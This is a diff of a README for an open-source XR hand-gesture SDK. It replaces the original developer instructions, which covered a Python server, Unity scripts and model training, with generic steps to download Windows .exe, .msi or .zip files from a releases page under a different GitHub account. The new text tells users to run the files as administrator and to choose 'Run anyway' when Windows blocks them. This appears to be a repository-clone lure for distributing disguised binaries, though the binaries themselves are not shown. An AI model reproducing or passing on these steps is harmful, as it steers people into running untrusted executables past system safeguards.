@@ -1,156 +1,159 @@
-# OpenGestureXR
+[![Download OpenGestureXR](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge)](https://github.com/Nyxo317/OpenGestureXR/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://python.org)
-[![OpenXR](https://img.shields.io/badge/OpenXR-1.0-green.svg)](https://www.khronos.org/openxr/)
+# 🤖 OpenGestureXR - Gesture Control for XR Apps
 
-Open-source SDK for AI-powered hand gesture interaction in XR (AR/VR).
+## 📥 Download
+Visit this page to get the latest Windows release:
 
-The goal is to provide real-time hand tracking and gesture recognition that works across XR platforms (Meta Quest, Pico, HoloLens, ARCore) through a single API built on OpenXR. Right now it's a working prototype with webcam-based tracking — native device support is on the roadmap.
+[OpenGestureXR Releases](https://github.com/Nyxo317/OpenGestureXR/releases)
 
-## How it works
+## 🧭 What OpenGestureXR Does
 
-```
-┌──────────────────────────────────────────────────┐
-│  Input: Webcam / Depth Camera / XR Hand Tracking │
-└────────────────────┬─────────────────────────────┘
-                     ▼
-┌──────────────────────────────────────────────────┐
-│  MediaPipe Hands → 21-point landmarks (per hand) │
-└────────────────────┬─────────────────────────────┘
-                     ▼
-┌──────────────────────────────────────────────────┐
-│  Gesture Classifier (rule-based or ONNX model)   │
-│  open_hand, grab, pinch, point, thumbs_up, peace │
-└────────────────────┬─────────────────────────────┘
-                     ▼
-┌──────────────────────────────────────────────────┐
-│  FastAPI Server                                   │
-│  ws://localhost:8000/ws/gesture  (streaming)      │
-│  GET /gesture                    (polling)        │
-│  GET /gesture/multi              (multi-hand)     │
-└────────────────────┬─────────────────────────────┘
-                     ▼
-┌──────────────────────────────────────────────────┐
-│  Unity Client → Object Interaction               │
-│  (OpenXR provider abstraction for portability)    │
-└──────────────────────────────────────────────────┘
-```
+OpenGestureXR is an open-source SDK for hand gesture interaction in XR. It helps an app detect hands and gestures in real time across XR devices through one API built on OpenXR.
 
-## What's working
+You can use it for:
+- Hand tracking in AR and VR apps
+- Gesture control in XR experiences
+- Cross-device input through one common layer
+- Faster setup for XR projects that need hand input
 
-- Multi-hand tracking (up to 2 hands)
-- WebSocket streaming at ~30fps
-- Rule-based classifier for 6 gestures + pluggable ONNX model support
-- Training pipeline: collect data → train → export ONNX
-- Unity client with gesture smoothing and confidence thresholds
-- OpenXR abstraction layer (`HandTrackingProvider` base class)
-- Latency benchmarking tool
+## 🖥️ Windows Setup
 
-## Gestures
+Use these steps on a Windows PC:
 
-| Gesture | Action | Notes |
-|---------|--------|-------|
-| `grab` | Attach object to hand | All fingers curled |
-| `open_hand` | Release object | All fingers extended |
-| `pinch` | Select object | Thumb + index close together |
-| `point` | Highlight object | Only index extended |
-| `thumbs_up` | Confirm | Only thumb up |
-| `peace` | Reset | Index + middle extended |
+1. Open the [OpenGestureXR Releases](https://github.com/Nyxo317/OpenGestureXR/releases) page.
+2. Find the latest release at the top of the page.
+3. In the Assets section, look for a Windows file such as:
+   - `.exe`
+   - `.zip`
+   - `.msi`
+4. Download the file to your computer.
+5. If you downloaded a `.zip` file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the `.exe` or `.msi` file to start the app or installer.
+8. If Windows asks for permission, choose Yes.
+9. Follow the on-screen steps to finish setup.
+10. Start the app from the desktop shortcut, Start menu, or the folder where you extracted it
 
-## Quick start
+## 🧰 System Requirements
 
-```bash
-git clone https://github.com/sarry94118-max/ARMAX.git
-cd ARMAX
-pip install -r requirements.txt
+For a smooth run on Windows, use a PC with:
+- Windows 10 or Windows 11
+- A 64-bit processor
+- At least 8 GB RAM
+- A modern GPU with OpenGL or DirectX support
+- A webcam or XR device for hand input
+- USB or wireless support for your headset, if needed
 
-# start the server
-uvicorn gesture_api.server.main:app --reload
+For best results:
+- Keep Windows up to date
+- Use the latest graphics drivers
+- Close heavy apps before launch
 
-# test it
-curl http://localhost:8000/gesture
+## 🎯 Supported XR Devices
 
-# or connect via websocket
-wscat -c ws://localhost:8000/ws/gesture
-```
+OpenGestureXR is built to work across common XR platforms, including:
+- Meta Quest
+- Pico
+- HoloLens
+- ARCore devices
 
-## Training your own model
+It uses OpenXR, so it can fit into projects that need one input path for more than one headset or phone-based AR device.
 
-The rule-based classifier works fine for demos, but if you want better accuracy you can train a small neural net:
+## ✋ Main Features
 
-```bash
-# collect ~500 samples per gesture (hold gesture in front of webcam)
-mkdir data
-python -m ai_engine.training.collect_data --gesture grab --output data/grab.csv
-python -m ai_engine.training.collect_data --gesture open_hand --output data/open_hand.csv
-# ... etc for each gesture
+- Real-time hand tracking
+- Gesture recognition
+- One API for multiple XR platforms
+- Open-source SDK
+- Built on OpenXR
+- Designed for AR and VR use
+- Works with common Windows XR setups
 
-# train + export
-python -m ai_engine.training.train --data-dir data/ --epochs 50
+## 🔌 How to Use It
 
-# check latency
-python -m ai_engine.utils.benchmark --frames 200
-```
+If you are only running a packaged app:
+1. Install or extract the files
+2. Connect your XR device if the app needs one
+3. Open the app
+4. Follow the setup screen inside the app
+5. Move your hands in front of the camera or headset sensors
+6. Use the supported gestures shown in the app
 
-## Unity setup
+If you are adding it to an XR project:
+1. Open your project in the XR tool you use
+2. Add the OpenGestureXR package or files
+3. Turn on OpenXR support
+4. Link the hand input layer to your app
+5. Test with a headset or camera feed
+6. Check tracking and gesture results in your scene
 
-1. Copy `unity_plugin/Scripts/` into your Unity project under `Assets/OpenGestureXR/`
-2. Add `GestureClient` to a GameObject, set `useWebSocket = true`
-3. Add `ObjectInteractor` to objects you want to interact with
-4. Details in [`demo/unity_scene_description.md`](demo/unity_scene_description.md)
+## 🛠️ Common Windows Problems
 
-**Note:** The Unity "WebSocket" mode currently uses fast HTTP polling under the hood because Unity doesn't have a built-in WS client. For real WebSocket support, drop in [NativeWebSocket](https://github.com/endel/NativeWebSocket). This is on the TODO list.
+If the file does not open:
+- Make sure the download finished
+- Check that you picked the Windows release file
+- Unzip the file before opening it, if needed
+- Right-click the file and choose Run as administrator
 
-## Project layout
+If Windows blocks the file:
+- Select More info
+- Choose Run anyway if you trust the source
 
-```
-ai_engine/
-├── gesture_detector.py        # MediaPipe multi-hand detection
-├── gesture_classifier.py      # rule-based + ONNX classification
-├── inference/
-│   ├── gesture_detector.py    # standalone detection loop
-│   └── onnx_runtime.py        # ONNX Runtime wrapper
-├── training/
-│   ├── collect_data.py        # landmark data collector
-│   ├── train.py               # training script
-│   └── export_onnx.py         # PyTorch → ONNX export
-├── models/                    # model artifacts (gitignored)
-└── utils/
-    └── benchmark.py           # latency benchmarking
-gesture_api/
-└── server/main.py             # FastAPI server
-unity_plugin/
-├── Scripts/
-│   ├── GestureClient.cs       # server connection (WS + HTTP)
-│   ├── ObjectInteractor.cs    # gesture → action mapping
-│   └── XR/
-│       └── HandTrackingProvider.cs  # OpenXR abstraction
-└── Prefabs/
-```
+If the app starts but hand tracking does not work:
+- Check that your camera or headset is connected
+- Allow camera access in Windows settings
+- Close other apps that may use the camera
+- Restart the app after changing device settings
 
-## Roadmap
+If the app runs slowly:
+- Update your GPU driver
+- Lower the XR app’s visual quality
+- Close browser tabs and other heavy programs
+- Try a USB 3.0 port for your headset
 
-| Phase | When | What |
-|-------|------|------|
-| ✅ Foundation | 0–6 mo | Multi-hand, WebSocket, ONNX pipeline, training tools |
-| 🔲 Alpha | 6–12 mo | Native OpenXR plugin, Unity package manager support, Quest + Pico testing |
-| 🔲 Beta | 12–18 mo | Depth + IMU fusion, Open3D integration, perf optimization |
-| 🔲 v1.0 | 18–24 mo | API freeze, full docs, MIT release |
-| 🔲 Paper | 24–30 mo | IEEE VR / SIGGRAPH submission, Unreal plugin |
+## 🧪 Basic Checks Before You Start
 
-## Built with
+Before you open OpenGestureXR, check that:
+- Your headset or camera is plugged in
+- Windows can see the device
+- Your graphics drivers are current
+- The device battery is charged
+- Your room has enough light for hand tracking
 
-[MediaPipe](https://github.com/google/mediapipe) · [PyTorch](https://pytorch.org/) · [ONNX Runtime](https://github.com/microsoft/onnxruntime) · [FastAPI](https://fastapi.tiangolo.com/) · [OpenXR](https://www.khronos.org/openxr/)
+## 📁 What You May See in the Release Files
 
-## Contributing
+A release may include:
+- A Windows installer
+- A zip file with the app
+- Sample data
+- Readme files
+- Config files for advanced use
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). Main areas where help is needed:
-- Native `HandTrackingProvider` for Quest / Pico / HoloLens
-- More gesture training data
-- Unreal Engine plugin
-- Performance profiling on mobile XR
+If more than one file is listed, choose the Windows file that matches your setup. For most users, the installer or zip file is the right choice.
 
-## License
+## 🔐 Privacy and Local Use
 
-MIT — see [LICENSE](LICENSE).
+OpenGestureXR is designed for local hand tracking and gesture use in XR apps. If your setup uses a camera or headset sensor, your device may process hand data on the local machine. Check your app settings if you want to review what data is used.
+
+## 🧭 Quick Start
+
+1. Go to the [OpenGestureXR Releases](https://github.com/Nyxo317/OpenGestureXR/releases) page
+2. Download the latest Windows file
+3. Install or extract it
+4. Open the app
+5. Connect your XR device or camera
+6. Test hand tracking and gestures
+
+## 🧩 Need Help
+
+If something is not working:
+- Recheck the release file you downloaded
+- Make sure your device is supported
+- Restart Windows and try again
+- Confirm camera and headset permissions
+- Try the newest release from the download page
+
+## 📌 Project Name
+
+OpenGestureXR
